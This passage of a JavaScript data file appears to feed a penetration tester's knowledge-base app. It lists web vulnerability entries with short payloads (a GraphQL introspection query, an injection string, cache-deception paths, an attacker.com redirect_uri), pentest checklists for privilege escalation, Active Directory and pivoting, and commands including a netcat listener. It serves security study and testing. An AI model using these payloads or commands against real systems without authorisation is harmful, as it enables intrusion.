            tools: ['InQL', 'GraphQLmap'],
            payloads: [
                "{__schema{types{name,fields{name}}}}",
                "User(id: 1 OR 1=1)",
                "Batching Attacks: [{query:...}, {query:...}]",
                "Aliases for brute force"
            ],
            reports: [
                { title: 'Shopify: Access Private Data via GraphQL', url: 'https://hackerone.com/reports/482345', bounty: '$15,000' },
                { title: 'GitHub: GraphQL Introspection Abuse', url: 'https://hackerone.com/reports/321523', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-18',
            title: 'Web Cache Deception',
            category: 'Caching',
            severity: 'Medium',
            description: 'Tricking a web cache into storing sensitive content and serving it to unauthorized users.',
            vectors: ['Path Confusion', 'Extension Hiding'],
            tools: ['Burp Suite'],
            payloads: [
                "/account.php/nonexistent.css",
                "/profile;%2f..%2f.js",
                "Force caching headers"
            ],
            reports: [
                { title: 'PayPal: Web Cache Deception', url: 'https://hackerone.com/reports/249156', bounty: '$10,000' },
                { title: 'OpenAI: ChatGPT Cache Deception', url: 'https://corneacristian.com/2024/02/21/chatgpt-web-cache-deception/', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-19',
            title: 'OAuth Misconfiguration',
            category: 'Authentication',
            severity: 'High',
            description: 'Weaknesses in OAuth 2.0 implementation allowing account takeover.',
            vectors: ['Redirect URI Manipulation', 'State Parameter Missing'],
            tools: ['Burp Suite'],
            payloads: [
                "Change redirect_uri to attacker.com",
                "CSRF on OAuth flow (remove state)",
                "Leaking Authorization Code via Referer",
                "Scope Escalation"
            ],
            reports: [
                { title: 'Facebook: OAuth Account Takeover', url: 'https://www.facebook.com/whitehat/research/', bounty: '$25,000' },
                { title: 'Airbnb: OAuth redirect_uri', url: 'https://hackerone.com/reports/12535', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-20',
            title: 'Subdomain Takeover',
            category: 'Infrastructure',
            severity: 'High',
            description: 'Claiming a subdomain that points to a non-existent cloud resource.',
            vectors: ['Dangling DNS Records'],
            tools: ['Subjack', 'Nuclei'],
            payloads: [
                "CNAME pointing to unclaimed S3 bucket",
                "CNAME pointing to deleted Azure App Service",
                "CNAME pointing to GitHub Pages (404)"
            ],
            reports: [
                { title: 'Uber: Subdomain Takeover', url: 'https://hackerone.com/reports/175324', bounty: '$5,000' },
                { title: 'Starbucks: Azure Takeover', url: 'https://hackerone.com/reports/256112', bounty: '$2,000' }
            ]
        }
    ],

    // --- PLAYBOOKS (Methodologies) ---
    playbooks: [
        {
            id: 'pb-1',
            title: 'Web App Penetration Testing',
            description: 'Standard methodology for assessing web application security (OWASP based).',
            steps: [
                { id: 's1', label: 'Passive Recon (Whois, DNS, OSINT)', checked: false },
                { id: 's2', label: 'Active Recon (Nmap, Directory Brute Force)', checked: false },
                { id: 's3', label: 'Vulnerability Scanning (Nikto, Nuclei)', checked: false },
                { id: 's4', label: 'Manual Testing (Auth Bypass, SQLi, XSS)', checked: false },
                { id: 's5', label: 'Post-Exploitation & Reporting', checked: false }
            ]
        },
        {
            id: 'pb-2',
            title: 'Linux Privilege Escalation',
            description: 'Checklist for escalating privileges on a compromised Linux host.',
            steps: [
                { id: 'l1', label: 'Check Kernel Version (DirtyCow, etc.)', checked: false },
                { id: 'l2', label: 'Check Sudo Permissions (sudo -l)', checked: false },
                { id: 'l3', label: 'Find SUID Binaries', checked: false },
                { id: 'l4', label: 'Check Cron Jobs & Writable Paths', checked: false },
                { id: 'l5', label: 'Search for Cleartext Passwords', checked: false }
            ]
        },
        {
            id: 'pb-3',
            title: 'Active Directory Enumeration',
            description: 'Initial steps when landing on a domain-joined machine.',
            steps: [
                { id: 'ad1', label: 'Identify Domain Controllers', checked: false },
                { id: 'ad2', label: 'Enumerate Users & Groups (BloodHound)', checked: false },
                { id: 'ad3', label: 'Check for SPNs (Kerberoasting)', checked: false },
                { id: 'ad4', label: 'Check for AS-REP Roasting', checked: false }
            ]
        },
        {
            id: 'pb-4',
            title: 'Windows Privilege Escalation',
            description: 'Methodology for elevating privileges on Windows systems.',
            steps: [
                { id: 'w1', label: 'Check System Info (systeminfo, whoami /priv)', checked: false },
                { id: 'w2', label: 'Unquoted Service Paths', checked: false },
                { id: 'w3', label: 'AlwaysInstallElevated Registry Key', checked: false },
                { id: 'w4', label: 'Saved Credentials (cmdkey /list, Unattend.xml)', checked: false },
                { id: 'w5', label: 'Kernel Exploits (Windows Exploit Suggester)', checked: false }
            ]
        },
        {
            id: 'pb-5',
            title: 'Network Pivoting & Tunneling',
            description: 'Techniques for moving laterally through a network.',
            steps: [
                { id: 'p1', label: 'Identify Dual-Homed Hosts (ipconfig/ifconfig)', checked: false },
                { id: 'p2', label: 'SSH Dynamic Port Forwarding (-D 1080)', checked: false },
                { id: 'p3', label: 'Chisel / Socat Tunneling', checked: false },
                { id: 'p4', label: 'Ligolo-ng Setup', checked: false },
                { id: 'p5', label: 'ProxyChains Configuration', checked: false }
            ]
        },
        {
            id: 'pb-6',
            title: 'OSINT Investigation',
            description: 'Open Source Intelligence gathering checklist.',
            steps: [
                { id: 'o1', label: 'Google Dorking (site:, ext:, inurl:)', checked: false },
                { id: 'o2', label: 'Social Media Enumeration (LinkedIn employees)', checked: false },
                { id: 'o3', label: 'GitHub/GitLab Secret leaks', checked: false },
                { id: 'o4', label: 'Shodan/Censys Infra Scan', checked: false },
                { id: 'o5', label: 'Breach Data Search (HaveIBeenPwned)', checked: false }
            ]
        },
        {
            id: 'pb-7',
            title: 'Mobile App Penetration Testing',
            description: 'Checklist for Android and iOS security assessments.',
            steps: [
                { id: 'm1', label: 'Static Analysis (MobSF, Decompilation)', checked: false },
                { id: 'm2', label: 'Dynamic Analysis (Frida, Objection)', checked: false },
                { id: 'm3', label: 'Check for Root/Jailbreak Detection', checked: false },
                { id: 'm4', label: 'Intercept Traffic (Burp + Cert Pinning Bypass)', checked: false },
                { id: 'm5', label: 'Insecure Data Storage (SharedPreferences, SQLite)', checked: false }
            ]
        },
        {
            id: 'pb-8',
            title: 'Cloud Security Assessment (AWS)',
            description: 'Steps for auditing AWS environments.',
            steps: [
                { id: 'c1', label: 'Enumerate IAM Permissions (enum-iam)', checked: false },
                { id: 'c2', label: 'Check S3 Bucket Policies (Public Access)', checked: false },
                { id: 'c3', label: 'Lambda Function Code Review', checked: false },
                { id: 'c4', label: 'EC2 Metadata Service (IMDSv1 vs v2)', checked: false },
                { id: 'c5', label: 'CloudTrail Log Auditing', checked: false }
            ]
        },
        {
            id: 'pb-9',
            title: 'Bug Bounty Recon Workflow',
            description: 'Step-by-step reconnaissance for bounty hunting.',
            steps: [
                { id: 'bb1', label: 'Subdomain Enumeration (Sublist3r, Amass)', checked: false },
                { id: 'bb2', label: 'Subdomain Takeover Checks (Subjack)', checked: false },
                { id: 'bb3', label: 'HTTP Probing & Screenshotting (httpx, EyeWitness)', checked: false },
                { id: 'bb4', label: 'Parameter Discovery (Arjun, ParamSpider)', checked: false },
                { id: 'bb5', label: 'Fuzzing for Hidden Endpoints (ffuf)', checked: false }
            ]
        },
        {
            id: 'pb-10',
            title: 'API Security Testing (OWASP API 10)',
            description: 'Checklist for auditing REST and GraphQL APIs.',
            steps: [
                { id: 'api1', label: 'BOLA/IDOR Checks (Resource IDs)', checked: false },
                { id: 'api2', label: 'Broken Authentication (JWT, API Keys)', checked: false },
                { id: 'api3', label: 'Excessive Data Exposure', checked: false },
                { id: 'api4', label: 'Mass Assignment (Auto-binding)', checked: false },
                { id: 'api5', label: 'Rate Limiting & Throttling Checks', checked: false }
            ]
        },
        {
            id: 'pb-11',
            title: 'Source Code Review (Whitebox)',
            description: 'Manual analysis of source code for vulnerabilities.',
            steps: [
                { id: 'src1', label: 'Grep for Secrets (API Keys, Passwords)', checked: false },
                { id: 'src2', label: 'Dangerous Functions (eval, system, exec)', checked: false },
                { id: 'src3', label: 'Input Validation Logic (Sanitization)', checked: false },
                { id: 'src4', label: 'Auth Middleware Review', checked: false },
                { id: 'src5', label: 'Dependency Check (Vulnerable Libraries)', checked: false }
            ]
        }
    ],

    commands: [
        { id: 'cmd-1', title: 'Nmap Fast Scan', cmd: 'nmap -T4 -F 10.10.10.10' },
        { id: 'cmd-2', title: 'Fuzzing Directory', cmd: 'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt' },
        { id: 'cmd-3', title: 'Netcat Listener', cmd: 'nc -lvnp 4444' }
    ],

    notes: [],

    // Core Logic Placeholder for UI to bind to if needed
    loadState: function () {
        // Return Self for easy access
        return this;
    },

    // Stub for saving snippet (in memory for this session)
    saveSnippet: function (snippet) {
        this.snippets.push(snippet);
        console.log("Snippet saved:", snippet);
    },

    savePlaybookState: function (pbId, steps) {
        const pb = this.playbooks.find(p => p.id === pbId);
        if (pb) pb.steps = steps;
        console.log("Playbook updated:", pbId);
    }
};

// Global Access
window.SecondBrainData = SecondBrainData;

// Initial Mock Interface for brain-ui.js compatibility
window.SecondBrain = {
    state: {},
    loadState: function () {
        // Ensure we always return the populated object
        return SecondBrainData;
    },
    saveSnippet: function (s) { SecondBrainData.saveSnippet(s); },
    savePlaybookState: function (id, s) { SecondBrainData.savePlaybookState(id, s); }
};
